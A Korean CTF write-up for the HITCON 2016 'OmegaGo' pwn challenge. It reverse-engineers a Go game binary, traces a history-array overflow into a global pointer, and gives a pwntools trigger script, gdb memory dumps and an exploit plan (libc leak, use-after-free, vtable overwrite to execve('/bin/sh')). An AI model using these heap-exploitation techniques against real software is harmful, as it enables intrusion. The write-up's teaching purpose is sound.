---
title: "Pwn-OmegaGo(350) - Solved by 3 Teams"
sidebar_position: 1
---


## **Information**

### **Description**
```
Want to fight with AlphaGo? Beat OmegaGo first.  
nc 52.198.232.90 31337

Note: The game rule has been simplified to make life easier.

[omega\_go](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac)  
[libc.so.6](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/libc.so.6_8674307c6c294e2f710def8c57925a50e60ee69e)
```

### **Files**
* [omega\_go\_6eef19dbb9f98b67af303f18978914d10d8f06ac](/attachments/327840/327839.bin)
* [libc.so.6\_8674307c6c294e2f710def8c57925a50e60ee69e](/attachments/327840/327838.bin)
* [omega\_go\_6eef19dbb9f98b67af303f18978914d10d8f06ac.i64](/attachments/327840/7537247.i64)

### **Source Code**

## **Write Up**

### OS information

* **해당 문제는 아래와 같은 환경에서 테스트 하였습니다.**
  + 실제 문제가 출제된 서버 환경과 다릅니다.

```sh title="OS information"
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.3 LTS
Release:	16.04
Codename:	xenial
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$
```

### File information

```sh title="File information"
autolycos@ubuntu:~/CTF/HITCON/OmegaGo$ file omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac 
omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=6101f150902c6814bd0576f35c60473105a5466e, stripped
autolycos@ubuntu:~/CTF/HITCON/OmegaGo$ checksec.sh --file omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac
autolycos@ubuntu:~/CTF/HITCON/OmegaGo$
```

### Binary analysis

* **다음과 같은 기능을 제공합니다.**
  + 행,열을 번호를 입력하여 원하는 영역에 마크를 표시할 수 있습니다.
    - Ex) A19
  + "surrender"를 이용하여 게임을 포기하고 다시 시작할 수 있습니다.
  + "regret"을 이용하여 플레이를 되돌릴 수 있습니다.

```sh title="Play game"
autolycos@ubuntu:~/CTF/HITCON/OmegaGo$ ./omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac 
   ABCDEFGHIJKLMNOPQRS
19 ...................
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
Time remain: O: 180.00, X: 180.00

A19
   ABCDEFGHIJKLMNOPQRS
19 X..................
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ..................O
Time remain: O: 180.00, X: 173.38

regret
   ABCDEFGHIJKLMNOPQRS
19 ...................
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
Time remain: O: 180.00, X: 180.00
surrender
This AI is too strong, ah?
Play history? (y/n)
y
   ABCDEFGHIJKLMNOPQRS
19 ...................
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
piece O play at J10
Time remain: O: 180.00, X: 180.00

Play again? (y/n)
y
   ABCDEFGHIJKLMNOPQRS
19 ...................
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
Time remain: O: 180.00, X: 180.00
```

#### **Struct**

* **해당 바이너리를 분석하기 위해 다음과 같은 구조체들이 필요합니다.**
  + 해당 바이너리는 C++로 개발되어 있으며 vtable을 사용하고 있습니다.
* **아래 구조체는 AI Class의 play함수를 표현하는 구조체 입니다.**

```cpp title="Struct for AI Class"
struct __attribute__((aligned(8))) Method
{
  void (__fastcall **Play)(Method *a, GameInfo *state, signed int player_number, uint32_t *row, uint32_t *col);
  _QWORD empty;
};
```

* **아래 구조체는 OmegaGo의 게임 정보를 저장하는 구조체 입니다.**

```cpp title="Struct for OmegaGo GameInfo"
struct GameInfo
{
  _QWORD board[12];
  _DWORD rowNumber;
  _DWORD colNumber;
  _QWORD player;
  double playTimeForAI;
  double playTimeForHuman;
};
```

#### **Main()**

* **해당 함수는 while() 함수를 이용하여 MainFunction()함수를 계속 호출합니다.**

```cpp title="main Function"
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 result; // rax@3
  __int64 v4; // rbx@3
  __int64 v5; // [rsp+8h] [rbp-18h]@1

  v5 = *MK_FP(__FS__, 40LL);
  alarm(0xB4u);
  setvbuf(stdout, 0LL, 2, 0LL);
  while (MainFunction());
  result = 0LL;
  v4 = *MK_FP(__FS__, 40LL) ^ v5;
  return result;
}
```

#### **MainFunction(0x401738)**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + setDefGameinfo() 함수를 통해 게임 진행시 필요한 변수의 초기화를 선언합니다.
  + **"operator new(8uLL)" 코드를 이용하여 AI, HUMAN 변수에 Heap 영역(8byte)을 할당합니다.**
    - setAIFunction(), setHUMANFunction() 함수를 이용해 할당 받은 영역에 호출할 함수의 주소를 저장합니다.
    - 각 구조체의 Play 포인터 함수에 저장되는 주소는 다음과 같습니다.
      * AI→Play(0x405040)→0x40290A
      * HUMAN→Play(0x405020)→0x402C12
    - 할당된 Heap 영역은 게임을 재시작해도 해제되지 않습니다.
  + **while()을 통해 게임을 플레이하기 위한 기능을 실행합니다.**
    - gettimeofday() 함수를 이용하여 플레이어의 게임 플레이 시간을 계산합니다.
    - rowNumber, colNumber 의 값이 -1과 같다면 게임을 종료합니다.
    - rowNumber, colNumber 의 값이 -2일 경우에는 게임 턴을 한차례 돌리는 regret()함수를 호출합니다.
    - 그외의 rowNumber, colNumber 값이 입력 되면 플레이어의 플레이시간을 저장합니다.
      * 총 플레이시간이 0.0보다 작으면 게임을 종료합니다.
      * 총 플레이시간이 0.0보다 크면 SetMarkForBoard()함수를 이용하여 게임 보드 rowNumber,colNumber 위치에 표시합니다.

```cpp title="MainFunction(0x401738)"
__int64 OmegaGo()
{
  Method *AI; // rbx
  Method *HUMAN; // rbx
  unsigned int rowNumber; // [rsp+Ch] [rbp-64h]
  unsigned int colNumber; // [rsp+10h] [rbp-60h]
  int playerNum; // [rsp+14h] [rbp-5Ch]
  double playTime; // [rsp+18h] [rbp-58h]
  struct timeval startTime; // [rsp+20h] [rbp-50h]
  struct timeval endTime; // [rsp+30h] [rbp-40h]
  Method *player[2]; // [rsp+40h] [rbp-30h]
  unsigned __int64 v10; // [rsp+58h] [rbp-18h]

  v10 = __readfsqword(0x28u);
  setDefGameinfo();
  playerNum = 1;
  AI = (Method *)operator new(8uLL);
  AI->Play = 0LL;
  setAIFunction(AI);
  player[0] = AI;
  HUMAN = (Method *)operator new(8uLL);
  HUMAN->Play = 0LL;
  setHUMANFunction(HUMAN);
  player[1] = HUMAN;
  while ( !((unsigned __int8)sub_401202(playerNum, &gPlayerGameInfo) ^ 1) )
  {
    gettimeofday(&startTime, 0LL);
    (*player[playerNum - 1]->Play)(player[playerNum - 1], &gPlayerGameInfo, playerNum, &rowNumber, &colNumber);
    gettimeofday(&endTime, 0LL);
    playTime = (double)(LODWORD(endTime.tv_usec) - LODWORD(startTime.tv_usec)) / 1000000.0
             + (double)(LODWORD(endTime.tv_sec) - LODWORD(startTime.tv_sec));
    if ( rowNumber == -1 || colNumber == -1 )
      break;
    if ( rowNumber != -2 && colNumber != -2 )
    {
      *(double *)&gPlayerGameInfo.board[playerNum - 1 + 14LL] = *(double *)&gPlayerGameInfo.board[playerNum - 1 + 14LL]
                                                              - playTime;
      if ( *(double *)&gPlayerGameInfo.board[playerNum - 1 + 14LL] < 0.0 )
        print("Time's up");
      SetMarkForBoard(&gPlayerGameInfo, rowNumber, colNumber, playerNum, 0);
      playerNum ^= 3u;
    }
    else if ( (unsigned __int8)regret() ^ 1 )
    {
      print("No you cant't");
    }
  }
  CheckResults();
  PlayHistory();
  return PlayAgain();
}
```

#### **UserInput(HUMAN→Play(0x405020)→0x402C12)**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + callPrintBoard() 함수에 의해 Borad가 출력됩니다.
  + scanf() 함수를 이용해 사용자로 부터 좌표 값 또는 명령어를 입력 받습니다.
    - **특이한 부분은 다음과 같습니다.**
      * 입력 받은 내용을 gCmd(0x60943C) 전역 변수에 저장
      * 10개의 문자를 입력 받지만 sscanf()함수에 의해 1개의 문자,1개의 숫자값을 사용
  + 입력 받은 명령어에 따라 다음과 같이 값을 설정합니다.
    - surrender : col = -1, row = -1
    - regret : col = -2, row = -2
  + 명령어가 아닐 경우 좌표 값이 저장됩니다.

```cpp title="UserInput(HUMAN→Play(0x405020)→0x402C12)"
unsigned __int64 __fastcall UserInput(__int64 a1, GameInfo *gameInfo, __int64 playerNum, signed int *row, signed int *col)
{
  bool areaOverflow; // al
  char chCol; // [rsp+37h] [rbp-9h]
  unsigned __int64 v10; // [rsp+38h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  callPrintBoard(gameInfo);
  memset(gCmd, 0, 0xCuLL);
  if ( scanf("%10s", gCmd) != 1 )
    print("Er?");
  if ( !strcmp("surrender", gCmd) )
  {
    *col = -1;
    *row = *col;
  }
  else if ( !strcmp("regret", gCmd) )
  {
    *col = -2;
    *row = *col;
  }
  else
  {
    if ( sscanf(gCmd, "%c%d", &chCol, row) != 2 )
      print("Input like 'A19'");
    *col = chCol - 65;
    *row = 19 - *row;
    areaOverflow = (unsigned __int8)checkBoardArea(*row) ^ 1 || (unsigned __int8)checkBoardArea(*col) ^ 1;
    if ( areaOverflow )
      print("No overflow plz.");
  }
  return __readfsqword(0x28u) ^ v10;
}
```

#### **SetMarkForBoard**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + player 변수의 값을 이용해 플레이어의 마크를 결정합니다.
  + saveMarkofBoard() 함수와 마크를 저장할 좌표 값(row, col)을 이용해gameinfo.Board[] 영역에 값을 저장합니다.
  + 각종 함수를 이용해 플레이어가 마크를 저장하길 원하는 위치 값이 타당한지 확인합니다.
    - CheckBoardArea(), GetMarkForBoard(), checkLocation(), ...
  + 입력한 위치 값이 정상적이지 않으면 메시지를 출력하고 프로그램을 종료합니다.
  + 입력한 위치 값이 정상적이라면 해당 gameInfo를 gHistory[]에 저장합니다.
    - "operator new(0x80)" 코드에 의해 Heap 영역을 할당합니다.
    - 할당된 Heap 영역의 주소 값을 gHistory[]변수에 저장합니다.
    - 즉, 사용자가 입력한 좌표 값이 Heap 영역에 저장됩니다.
* **취약성은 여기서 발생합니다.**
  + GameInfo 구조체를 사용하는 gHistory[]의 크기는 364 입니다.
  + gHistory[] 배열에 저장된 번호가 364를 넘는지에 대한 확인이 없습니다.
  + 유저가 입력한 값이 364회가 넘으면 gPlayerGameInfo 전역 변수에 **Heap addresss**가 Overflow됩니다.
  + 즉, **사용자가 입력한 위치 값에 의해 Heap addresss를 변경**할 수 있습니다.

```cpp title="SetMarkForBoard()"
signed __int64 __fastcall SetMarkForBoard(GameInfo *gameinfo, unsigned int inputRow, unsigned int inputCol, int player, unsigned __int8 printOpt)
{
  signed __int64 result; // rax
  signed int mark; // eax MAPDST
  bool v7; // al
  GameInfo *historyCount; // rax
  GameInfo *saveGameInfo; // ST30_8
  signed int i; // [rsp+24h] [rbp-2Ch]
  unsigned int row; // [rsp+28h] [rbp-28h]
  unsigned int col; // [rsp+2Ch] [rbp-24h]

  if ( (unsigned __int8)GetMarkForBoard((__int64)gameinfo, inputRow, inputCol) == '.' )
  {
    if ( player == 1 )
      mark = 'O';
    else
      mark = 'X';
    saveMarkofBoard((__int64)gameinfo, inputRow, inputCol, mark);
    gameinfo->rowNumber = inputRow;
    gameinfo->colNumber = inputCol;
    for ( i = 0; i <= 3; ++i )
    {
      row = dword_404FE0[i] + inputRow;
      col = dword_404FF0[i] + inputCol;
      v7 = (unsigned __int8)CheckBoardArea(row) ^ 1 || (unsigned __int8)CheckBoardArea(col) ^ 1;
      if ( !v7
        && (char)GetMarkForBoard((__int64)gameinfo, row, col) == 0xA7 - mark
        && (unsigned int)checkLocation((__int64)gameinfo, row, col) == 0 )
      {
        sub_4024C2((__int64)gameinfo, row, col);
      }
    }
    if ( (unsigned int)checkLocation((__int64)gameinfo, inputRow, inputCol) == 0 )
    {
      if ( !printOpt )
        print("Why you do this :((");
      result = 0LL;
    }
    else if ( (unsigned __int8)sub_402528((__int64)gameinfo, printOpt) )
    {
      if ( !printOpt )
        print("Wanna Ko Fight?");
      result = 0LL;
    }
    else
    {
      if ( printOpt != 1 )
      {
        LODWORD(gameinfo->player) = mark;
        historyCount = (GameInfo *)operator new(0x80uLL);
        *historyCount = *gameinfo;
        saveGameInfo = historyCount;
        LODWORD(historyCount) = gHistoryCount++;
        gHistory[(signed int)historyCount] = saveGameInfo;
      }
      result = 1LL;
    }
  }
  else
  {
    if ( !printOpt )
      print("You cheater!");
    result = 0LL;
  }
  return result;
}
```

#### **regret()**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + historyCnt변수의 값이 0 일 경우 해당 함수는 종료됩니다.
  + historyCnt변수의 값이 0 아닐 경우 다음과 같은 코드를 실행합니다.
    - DeletePlayHistory() 함수를 이용해 gHistory[] 에 맨 마지막에 플레이한 GameInfo를 삭제 합니다.
      * AI, Human의 플레이 기록을 삭제합니다.
    - AI가 마지막에 플레이한 GameInfo를 추출해 gPlayerGameInfo에 저장합니다.
  + **여기서도 악용 할 수 있는 코드가 있습니다.**
    - 앞에서 설명한 취약성에 의해 gPlayerGameInfo 전역 변수(gHistory[365]) 에 Heap addresss가 Overflow됩니다.
    - 사용자 입력 값을 이용해 gPlayerGameInfo 전역 변수(gHistory[365])에 저장된 Heap addresss를 변경합니다.
      * gHistory[365] : 변경된 Heap addresss
      * gHistory[366] : Heap addresss
      * gHistory[367] : Heap addresss
    - regret() 함수가 호출되면 "history = (GameInfo \*)::gHistory[historyCnt - 1];" 코드에 의해 "변경된 Heap addresss"를 기준으로 GameInfo를 출력하게 됩니다.
    - 즉, 해당 취약성을 이용해 Libc addresss를 출력 할 수 있습니다.

```cpp title="regret()"
signed __int64 __cdecl regret()
{
  GameInfo *history; // rax

  if ( historyCnt <= 1 )
    return 0LL;
  DeletePlayHistory();                          // AI play history
  DeletePlayHistory();                          // Human play history
  if ( ::gHistory[historyCnt - 1] )
  {
    history = (GameInfo *)::gHistory[historyCnt - 1];
    gPlayerGameInfo.board[0] = history->board[0];
    gPlayerGameInfo.board[1] = history->board[1];
    gPlayerGameInfo.board[2] = history->board[2];
    gPlayerGameInfo.board[3] = history->board[3];
    gPlayerGameInfo.board[4] = history->board[4];
    gPlayerGameInfo.board[5] = history->board[5];
    gPlayerGameInfo.board[6] = history->board[6];
    gPlayerGameInfo.board[7] = history->board[7];
    gPlayerGameInfo.board[8] = history->board[8];
    gPlayerGameInfo.board[9] = history->board[9];
    gPlayerGameInfo.board[10] = history->board[10];
    gPlayerGameInfo.board[11] = history->board[11];
    *(_QWORD *)&gPlayerGameInfo.rowNumber = *(_QWORD *)&history->rowNumber;
    gPlayerGameInfo.player = history->player;
    gPlayerGameInfo.playTimeFor[0] = history->playTimeFor[0];
    gPlayerGameInfo.playTimeFor[1] = history->playTimeFor[1];
  }
  return 1LL;
}
```

#### **DeletePlayHistory**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + gHistory[]에 저장된 heap 영역을 해제합니다.

```cpp title="DeletePlayHistory()"
unsigned __int64 DeletePlayHistory()
{
  __int64 v1; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( gHistory[historyCnt - 1] )
  {
    v1 = sub_401EB6((GameInfo *)gHistory[historyCnt - 1]);
    operator delete(gHistory[historyCnt - 1]);
    sub_402FE6(&unk_607220, &v1);
    --historyCnt;
  }
  return __readfsqword(0x28u) ^ v2;
}
```

### **Debuging**

#### **Overflow**

* **다음과 같은 코드를 이용하여 gameInfo 전역 변수의 값을 Overflow할 수 있습니다.**

```python title="Overflow for gameInfo"
from pwn import *

#context.log_level = 'debug'

col_list = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S']

p = process('omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac')

def Play(location):
	p.recvuntil('\n\n')
	p.sendline(location)

def Fill(colStart, colEnd, row):
	for colNum in range(col_list.index(colStart),col_list.index(colEnd)+1):
		locate = str(col_list[colNum])
		locate += str(row)
		Play(locate)

Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)
Fill('A','K',12)

p.interactive()
```

* **디버깅 전에 각 전역 변수의 위치를 알아야 합니다.**
  + gGameInfo : 0x609FC0
  + gHistory : 0x609460
  + gPlayerGameInfo Addresss(0x609FC0) - gHistory(0x609460) = 0xb60(2912) / 0x8(addresss len) = 364
* **다음은 디버깅을 통해 확인한 내용입니다.**
  + gPlayerGameInfo(0x609fc0) 전역 변수에 heap addresss(0x609fc0)값이 저장된 것을 확인 할 수 있습니다.

```sh title="overflow for gameInfo"
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$ gdb -q -p 3491
Attaching to process 3491

gdb-peda$ x/gx 0x609FC0
0x609fc0:	0x0000000000b94da0
gdb-peda$ x/10gx 0x609FC0
0x609fc0:	0x0000000000b94da0	0x0000000000000000
0x609fd0:	0x0000000000000000	0x0000000000000000
0x609fe0:	0xaaaa0000aaaaa800	0x50000100002aaaaa
0x609ff0:	0x5554000155555555	0x0000000000000055
0x60a000:	0x0000000000000000	0x0000000000000000
```

* **해당 Overflow를 통해 출력되는 Board의 내용이 변경된 것을 확인 할 수 있습니다.**
  + 우리는 해당 정보를 이용하여 heap addresss를 추출 할 수 있습니다.

```sh title="overflow for gameInfo"
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$ python test.py 
[!] Cold not find executable 'omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac' in $PATH, using './omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac' instead
[+] Starting local process './omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac': pid 3491
[*] Switching to interactive mode
   ABCDEFGHIJKLMNOPQRS
19 ..XXO\x00.OOX\x00X.......
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 XXXXXXXXXXX........
11 XXXXXXXXXXXXXXXXXXX
10 .........O.........
 9 OOOOOOOOOOOOOOOOOOO
 8 ........OOOOOOOOOOO
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
Time remain: O: 180.00, X: 179.84

$
```

#### **Decode**
* **화면에 출력된 Addresss를 해석하기 위해서는 Board에 저장되는 Mark의 값이 어떻게 관리 되는지 확인이 필요합니다.**
* **다음과 같이 유저가 좌표 값을 입력하면 메모리 값은 다음과 같이 변경됩니다.**
  + 유저가 입력한 값은 0x609fc0 영역에 0x2가 저장됩니다.
  + 컴퓨터가 입력한 값은 0x60a01A 영역에 0x1가 저장됩니다.

```sh title="Coordinates input" 
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$ gdb -q ./omega*
Reading symbols from ./omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/OmegaGo/omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac 

...Print board...
Time remain: O: 180.00, X: 180.00

A19

...Print board...
Time remain: O: 180.00, X: 171.04

^C
Program received signal SIGINT, Interrupt.

gdb-peda$ x/12gx 0x609FC0
0x609fc0:	0x0000000000000002	0x0000000000000000
0x609fd0:	0x0000000000000000	0x0000000000000000
0x609fe0:	0x0000000000000000	0x0000010000000000
0x609ff0:	0x0000000000000000	0x0000000000000000
0x60a000:	0x0000000000000000	0x0000000000000000
0x60a010:	0x0000000000000000	0x0000000000010000
gdb-peda$
```

* **다음과 같이 추가적인 메모리의 변화를 확인합니다.**
  + 사용자 입력을 통해 19행을 모두 채우면 메모리에 다음과 같이 저장됩니다.
    - 유저가 입력한 값은 0x2aaaaaaaaa 입니다.
    - 컴퓨터가 입력한 값은 0x01555555555 입니다.

```sh title="Fill in line 19"
   ABCDEFGHIJKLMNOPQRS
19 XXXXXXXXXXXXXXXXXXX
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 OOOOOOOOOOOOOOOOOOO
Time remain: O: 180.00, X: 141.02

^C
Program received signal SIGINT, Interrupt.
0x00007ffff75e66b0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:81
81	../sysdeps/unix/syscall-template.S: No such file or directory.
gdb-peda$  x/12gx 0x609FC0
0x609fc0:	0x0000002aaaaaaaaa	0x0000000000000000
0x609fd0:	0x0000000000000000	0x0000000000000000
0x609fe0:	0x0000000000000000	0x0000010000000000
0x609ff0:	0x0000000000000000	0x0000000000000000
0x60a000:	0x0000000000000000	0x0000000000000000
0x60a010:	0x5555500000000000	0x0000000000015555
gdb-peda$
```

* **Board에 저장되는 값을 다음과 같은 방법으로 관리됩니다.**
  + Board영역에 저장되는 값을 bit를 이용해 저장될 값을 결정합니다.
  + 다음과 같은 bit값을 이용해 player를 구분합니다.
    - AI : 10 bit
    - Humman : 01bit

:::note[Mark]
| Mark /  Player | X / O | | X. / O. | | XX / OO | |
| --- | --- | --- | --- | --- | --- | --- |
| bit | hex | bit | hex | bit | hex |
| AI | 10 | 0x2 | 1000 | 0x8 | 1010 | 0xA |
| Humman | 01 | 0x1 | 0100 | 0x4 | 0101 | 0x5 |
:::

* **이러한 정보를 이용하여 다음과 같은 복호화 도구를 작성할 수 있습니다.**

```python title="Decode"
def decode(offset):
    bit_offset = offset * 8
    data = ''.join(board)
    result = 0
    for i in xrange(32):
        states = '.OX\0'
        val = states.index(data[bit_offset + i])
        result |= val << (i * 2)
    return result
```

### Structure of Exploit code

* Payload의 순서는 다음과 같습니다.

:::note[Payload 순서]
1. Leak Libc Addresss
2. Overwrite the Computer Class
3. Overwrite the vtable
:::

* 이를 조금더 자세하게 설명하면 다음과 같습니다.

:::note[상세 설명]
1. LeakLibcAddresss
   1. Overwrites gameInfo data
   2. Heap addresss change
   3. Deletes the allocated heap memory.
2. Overwrite the Computer Class
   1. Memory reallocation
   2. Create a UAF vulnerability(Fake chunk)
   3. Heap addresss change
   4. Deletes the allocated heap memory.
3. Overwrite the vtable
   1. execve("/bin/sh")
:::

* payload를 바탕으로 공격을 위해 알아내어야 할 정보는 다음과 같습니다.

:::note[정보 목록]
* Leak libc addresss
* Fake chunk
* execve("/bin/sh")
:::

* 다음과 같은 구조로 shell을 획득합니다.

:::note[Shell Code]
|  | vtable | void (\_\_fastcall \*Play) | void (\_\_fastcall \*Play) |
| --- | --- | --- | --- |
| AI | Heap addresss | 0x405040 | 0x40290A |
| AI | Heap addresss(UAF) | gCmd(0x60943C) 전역 변수 | User input(Call One gadget) |
:::

### **Information for attack**

#### **Leak Libc addresss**

* **다음과 같이 "regret"기능을 이용해 Heap 영역에 "main\_arena.top" 영역의 주소를 저장 할 수 있습니다.**
  + 사용자가 위치 값을 입력하면 GameInfo(0x80)를 생성해서 gHistory[]에 저장합니다.
    - AI GameInfo : 0x61d220
    - HUMAN GameInfo : 0x61d160
  + AI,HUMAN GameInfo 사이에 크기가 0x20인 Heap 영역이 할당되어 있습니다.  
    - Heap addresss : 0x61d1f0

```sh title="gHistory[] info"
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$ gdb -q ./omega*
Reading symbols from ./omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/OmegaGo/omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac 
   ABCDEFGHIJKLMNOPQRS

...Print board...

Time remain: O: 180.00, X: 180.00
A19
   ABCDEFGHIJKLMNOPQRS

...Print board...

Time remain: O: 180.00, X: 176.49

^C
Program received signal SIGINT, Interrupt.
gdb-peda$ x/4gx 0x609460
0x609460:	0x000000000061cc90	0x000000000061d160
0x609470:	0x000000000061d220	0x0000000000000000
gdb-peda$ x/4gx 0x000000000061d160 - 0x10
0x61d150:	0xb3c74b70123a5ec4	0x0000000000000091
0x61d160:	0x0000000000000002	0x0000000000000000
gdb-peda$ x/4gx 0x000000000061d220 - 0x10
0x61d210:	0x91f146e6557b6e4a	0x0000000000000091
0x61d220:	0x0000000000000002	0x0000000000000000
gdb-peda$ x/4gx 0x61d1e0
0x61d1e0:	0xf90d94745f8a1984	0x0000000000000031
0x61d1f0:	0xeeda74e900000001	0x0000000000607228
gdb-peda$
```

* **"regret" 기능을 호출하게되면 gHistory[]의 맨 마지막에 저장된 2개의 GameInfo를 삭제합니다.**
  + 분석을 위해 "0x4015CE" 영역에 Break point를 설정합니다.
  + AI GameInfo(0x61d220) 영역이 해제되면 해당 영역이 Top chunk가 됩니다.
    - 0x61d210 영역이 main\_arena의 top 영역에 저장됩니다.
  + HUMAN GameInfo(0x61d160) 영역이 해제되면 해당 영역은 Unsorted chunk가 됩니다.  
    - 0x61d150 영역이 main\_arena.bin[0], [1] 영역에 저장됩니다.
    - Unsorted chunk(0x61d150)의 fd, bk 영역에 main\_arena.top의 주소 값이 저장됩니다.

```sh title="Create libc address"
gdb-peda$ b *0x4015CE
Breakpoint 1 at 0x4015ce
gdb-peda$ c
Continuing.
regret
Breakpoint 1, 0x00000000004015ce in ?? ()
gdb-peda$ i r rdi
rdi            0x61d220	0x61d220
gdb-peda$ p main_arena.top
$1 = (mchunkptr) 0x61d210
gdb-peda$ c
Continuing.

Breakpoint 1, 0x00000000004015ce in ?? ()
gdb-peda$ i r rdi
rdi            0x61d160	0x61d160
gdb-peda$ ni
gdb-peda$ p main_arena.bins[0]
$2 = (mchunkptr) 0x61d150
gdb-peda$ p main_arena.bins[1]
$3 = (mchunkptr) 0x61d150
gdb-peda$ 
gdb-peda$ x/4gx 0x61d150
0x61d150:	0xb3c74b70123a5ec4	0x0000000000000091
0x61d160:	0x00007ffff7839b78	0x00007ffff7839b78
gdb-peda$
```

* ****gPlayerGameInfo에 저장된 값(Heap addresss)을 변경하기 전에 중요한 부분이 있습니다.****
  + 그것은 바로 gPlayerGameInfo에 저장된 값(Heap addresss) 입니다.
    - 해당 프로그램은 2bit를 이용해 HUMAN,AI의 표시를 구분합니다.
  + 다음으로 중요한 것은 사용자 입력값에 의해 2bit 모두 1이 될 수 없습니다.
  + 즉, 사용자 입력 값으로 gPlayerGameInfo에 저장된 값을 변경하는데 제약이 있다는 것입니다.
* **다음은 gPlayerGameInfo 전역변수에 0x61cc90 값이 저장되어 있을 경우 입니다.**
  + 해당 주소를 bit로 변경하면 "0110 0001 1100 1100 1001 0000"이 됩니다.
  + 여기서 사용자가 값을 입력 할 수 있는 부분은 다음과 같습니다.
    - bit의 값이 "00"인 부분만 값을 저장 할 수 있습니다.
    - "0110 0001 1100 1100 1001 0000"
  + gPlayerGameInfo 전역변수에 저장되는 주소 값을 변경하기 위해서 surrender() 함수를 호출하는 것으로 해결 할 수 있습니다.  
    - surrender() 함수를 호출하면 게임이 재설정됩니다.
    - 재설정이 이전에 사용하던 AI, HUMAN Class 의 vtable 영역은 해제가 되지 않기 때문에 gPlayerGameInfo 전역변수에 저장되는 Heap 주소가 변경됩니다.
* **다음과 같은 방법으로 gPlayerGameInfo에 저장된 값(Heap addresss)을 변경할 수 있습니다.**
  + Script를 이용해 gHistory[]영역에 GameInfo를 365개를 저장합니다.
    - 이로 인해 gPlayerGameInfo의 board[0] 영역에 Heap 영역이 저장됩니다.
      * gPlayerGameInfo(0x609fc0) : 0x1c88e30
    - gPlayerGameInfo 영역에 저장된 Heap 주소 값은 사용자 입력 값으로 변경 할 수 있습니다.
  + 사용자 입력 값으로 "D19"를 입력합니다.
    - 해당 값으로 인해 gPlayerGameInfo에 저장된 Heap 주소가 "0x1c88e30" 에서 "0x1c88eb0"으로 변경되었습니다.
      * "0x1c88e30" + "0x80" = 0x1c88eb0

```sh title="Change the Heap address."
lazenca0x0@ubuntu:~$ gdb -p 4425
gdb-peda$ x/4gx 0x609FC0
0x609fc0:	0x0000000001c88e30	0x0000000000000000
0x609fd0:	0x0000000000000000	0x0000000000000000
gdb-peda$ b *0x4015CE
Breakpoint 1 at 0x4015ce
gdb-peda$ c
Continuing.

Input "D19"

gdb-peda$ x/4gx 0x609FC0
0x609fc0:	0x0000000001c88eb0	0x0000000001c88ef0
0x609fd0:	0x0000000001c88fb0	0x0000000000000000

gdb-peda$ p/x 0x1c88e30 + 0x80
$1 = 0x1c88eb0
gdb-peda$
```

